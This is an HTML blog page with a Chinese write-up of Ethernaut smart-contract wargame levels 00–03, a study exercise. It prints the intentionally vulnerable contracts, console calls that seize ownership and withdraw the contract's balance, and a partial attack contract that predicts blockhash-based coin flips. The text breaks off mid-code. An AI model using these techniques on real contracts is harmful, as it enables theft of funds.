@@ -1,0 +1,318 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Ethernaut区块链安全闯关00-06writeup | 第647号宇宙の研究所</title><meta name="author" content="M4nd3l3y3v"><meta name="copyright" content="M4nd3l3y3v"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Ethernaut区块链安全闯关00-06writeup00 Hello Ethernaut这关主要是熟悉环境，知道如何用前端跟区块链上的智能合约进行交互； 用前端交互主要是用web3.js和ether.js这两个库，也就是用JavaScript，因此我们要用控制台，F12打开控制台。 这个ethernaut用的是web3.js，web3.js有一些内置函数或者功能，可以输入help()获取。 我">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut区块链安全闯关00-06writeup">
+<meta property="og:url" content="http://example.com/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/index.html">
+<meta property="og:site_name" content="第647号宇宙の研究所">
+<meta property="og:description" content="Ethernaut区块链安全闯关00-06writeup00 Hello Ethernaut这关主要是熟悉环境，知道如何用前端跟区块链上的智能合约进行交互； 用前端交互主要是用web3.js和ether.js这两个库，也就是用JavaScript，因此我们要用控制台，F12打开控制台。 这个ethernaut用的是web3.js，web3.js有一些内置函数或者功能，可以输入help()获取。 我">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/miku.png">
+<meta property="article:published_time" content="2025-02-22T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-02-23T11:01:54.421Z">
+<meta property="article:author" content="M4nd3l3y3v">
+<meta property="article:tag" content="blockchain">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/miku.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Ethernaut区块链安全闯关00-06writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-02-23 19:01:54'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/miku.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 知识库</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/security/"><i class="fa-fw fas fa-shield"></i><span> Security</span></a></li><li><a class="site-page child" href="/forensics/"><i class="fa-fw fas fa-search"></i><span> Forensics</span></a></li><li><a class="site-page child" href="/development/"><i class="fa-fw fas fa-hammer"></i><span> Development</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> writeups</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/ctf_wp/"><i class="fa-fw fas fa-shield"></i><span> ctf</span></a></li><li><a class="site-page child" href="/forensics_wp/"><i class="fa-fw fas fa-search"></i><span> Forensics</span></a></li><li><a class="site-page child" href="/development_note/"><i class="fa-fw fas fa-hammer"></i><span> Development_experience</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background1.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="第647号宇宙の研究所"><span class="site-name">第647号宇宙の研究所</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 知识库</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/security/"><i class="fa-fw fas fa-shield"></i><span> Security</span></a></li><li><a class="site-page child" href="/forensics/"><i class="fa-fw fas fa-search"></i><span> Forensics</span></a></li><li><a class="site-page child" href="/development/"><i class="fa-fw fas fa-hammer"></i><span> Development</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> writeups</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/ctf_wp/"><i class="fa-fw fas fa-shield"></i><span> ctf</span></a></li><li><a class="site-page child" href="/forensics_wp/"><i class="fa-fw fas fa-search"></i><span> Forensics</span></a></li><li><a class="site-page child" href="/development_note/"><i class="fa-fw fas fa-hammer"></i><span> Development_experience</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Ethernaut区块链安全闯关00-06writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-22T16:00:00.000Z" title="发表于 2025-02-23 00:00:00">2025-02-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-23T11:01:54.421Z" title="更新于 2025-02-23 19:01:54">2025-02-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Ethernaut区块链安全闯关00-06writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Ethernaut区块链安全闯关00-06writeup"><a href="#Ethernaut区块链安全闯关00-06writeup" class="headerlink" title="Ethernaut区块链安全闯关00-06writeup"></a><strong>Ethernaut区块链安全闯关00-06writeup</strong></h1><h2 id="00-Hello-Ethernaut"><a href="#00-Hello-Ethernaut" class="headerlink" title="00 Hello Ethernaut"></a><strong>00 Hello Ethernaut</strong></h2><p>这关主要是熟悉环境，知道如何用前端跟区块链上的智能合约进行交互；</p>
+<p>用前端交互主要是用web3.js和ether.js这两个库，也就是用JavaScript，因此我们要用控制台，F12打开控制台。</p>
+<p>这个ethernaut用的是web3.js，web3.js有一些内置函数或者功能，可以输入help()获取。</p>
+<p>我们生成实例，就可以开始用contract和智能合约交互了，输入contract，我们可以看到合约的ABI，这是一个json，里面有这个合约的函数；题目中提示我们输入contract.info()查看合约信息；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;You will find what you need in info1().&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>contract.info1()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>contract.info2(“hello”)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;The property infoNum holds the number of the next info method to call.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>(contract.infoNum()).toString（原因是这里的数据类型是uint8，八位无符号整数，通关后在源码看到）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;42&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>contract.info42()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;theMethodName is the name of the next method.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>contract.theMethodName()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;The method name is method7123949.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>contract.method7123949()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;If you know the password, submit it to authenticate().&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>contract.password()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;ethernaut0&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>contract.authenticate(‘’ethernaut0’’)</p>
+<p>最后提交，结束。源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line">    string public password;</span><br><span class="line">    uint8 public infoNum = 42;</span><br><span class="line">    string public theMethodName = &quot;The method name is method7123949.&quot;;</span><br><span class="line">    bool private cleared = false;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _password) &#123;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;You will find what you need in info1().&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info1() public pure returns (string memory) &#123;</span><br><span class="line">        return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&quot;hello&quot;))) &#123;</span><br><span class="line">            return &quot;The property infoNum holds the number of the next info method to call.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Wrong parameter.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info42() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;theMethodName is the name of the next method.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;If you know the password, submit it to authenticate().&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate(string memory passkey) public &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">            cleared = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getCleared() public view returns (bool) &#123;</span><br><span class="line">        return cleared;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>知识点：智能合约ABI、web3.js&amp;ether.js和toString方法</p>
+<h2 id="01-Fallback"><a href="#01-Fallback" class="headerlink" title="01 Fallback"></a><strong>01 Fallback</strong></h2><p>这关的任务有两个：</p>
+<p>1.获取合约的所有权</p>
+<p>2.提走智能合约里的钱</p>
+<p>源代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先构造函数初始化一些变量，将msg.sender的值赋给owner；msg.sender指的是调用函数的人的地址，在这里理解为合约所有者调用了构造函数，我们要获取所有权就必须自己调动包含owner&#x3D;msg.sender的函数。构造函数我们当然是无法调动的，那就有contribute和receive，receive函数是fallback函数的一种，在接收到以太币转账的时候触发，允许调用receive的人获取合约所有权，但是转账数额必须大于0且贡献值大于0；而contribute函数有payable标识符，可以接受以太币，但每次不超过0.001ETH且必须贡献者大于所有者，也就是要转账最少1000&#x2F;0.01次，不太现实，因此考虑receive函数，但是我们要先用contribute转账以确保贡献值大于0，再用receive转账方可获取所有权。然后因为满足了withdraw提现函数的修饰符，所以可以提钱将余额变成0</p>
+<p>注：对于payable标识符的函数，转账方式和sendTransaction()是一样的</p>
+<p>sendTransaction({value:(单位是Wei，所以数字不能过小了),to:(address),from:(address)})</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="title function_">toWei</span>(<span class="string">&quot;0.0001&quot;</span>)&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>:<span class="title function_">toWei</span>(<span class="string">&quot;0.0001&quot;</span>)&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>()</span><br></pre></td></tr></table></figure>
+
+<p>知识点：Fallback函数、构造函数、modifier自定义标识符，payable标识符、sendTransaction，智能合约所有权，msg.sender</p>
+<h2 id="02-Fallout"><a href="#02-Fallout" class="headerlink" title="02 Fallout"></a><strong>02 Fallout</strong></h2><p>这关也是获取智能合约的所有权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    /* constructor */</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析合约，发现合约的致命错误，构造函数写错了：</p>
+<p>新版本的智能合约用constructor标识符标识构造函数；</p>
+<p>旧版本的智能合约构造函数是和合约同名的函数。但这里明显名字错了，所以不再是构造函数，所以可以外部调用，调用即可获取合约所有权。</p>
+<p>知识点：旧版构造函数安全问题</p>
+<h2 id="03-CoinFlip"><a href="#03-CoinFlip" class="headerlink" title="03 CoinFlip"></a><strong>03 CoinFlip</strong></h2><p>这个关卡的要求是连续才对硬币10次，否则胜利清零，源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析源码，声明了三个变量consecutiveWins，lastHash和FACTOR,初始化consecutiveWins为0，也就是猜硬币胜利次数的计数器；只有一个flip函数用于猜硬币，输入布尔值为参数。函数通过获取上一个区块的编号哈希，转换类型为256位无符号整数blockValue，其可能区间为[0,2^256^-1]，然后检查如果blockValue没有变化，回滚交易，然后再把新的blockValue赋值给lastHash用作检查，确保每次猜硬币结果都不一样。然后用blockValue除FACTOR取商，如果是1，硬币的side记为true，反之为false；FACTOR实际上是2^255^，如果blockValue在[0,2^255^-1]，硬币是false，概率为1&#x2F;2，因此true也为1&#x2F;2。然后检查，如果参数值_guess等于硬币的面，那么计数器加1，反之清0。</p>
+<p>这里再用前端调用合同的flip函数真的就是在盲猜了，连续猜对十次还是很难的。这里我们就需要自己写一份智能合约调用这份智能合约，这样由于在同一个区块内，所以可以提前预知blockValue，做到连续猜对十次。这里用Remix IDE写代码并且编译、部署。攻击合约如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  //指定开源许可证，MIT 许可证是一种非常宽松的开源许可证，允许用户自由地使用、复制、修改和分发代码，甚至可以用于商业项目。</span><br><span class="line">pragma solidity ^0.6.12; //指定solidity编译器的版本，版本大于0.6.12</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;; //导入SafeMath库，进行安全数学运算，防止结果溢出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface flip_coins &#123;</span><br><span class="line">    function flip(bool _guess) external  returns (bool);</span><br><span class="line">&#125;//用接口调用目标合约的函数，注意把标识符改为external</span><br><span class="line">contract FLIPCOIN&#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    address levelInstance;//声明levelInstance作为目标合约地址</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    constructor(address _levelInstance) public &#123;</span><br><span class="line">        levelInstance=_levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line">    function Guess_side() public returns(bool)&#123;</span><br><span class="line">        uint256 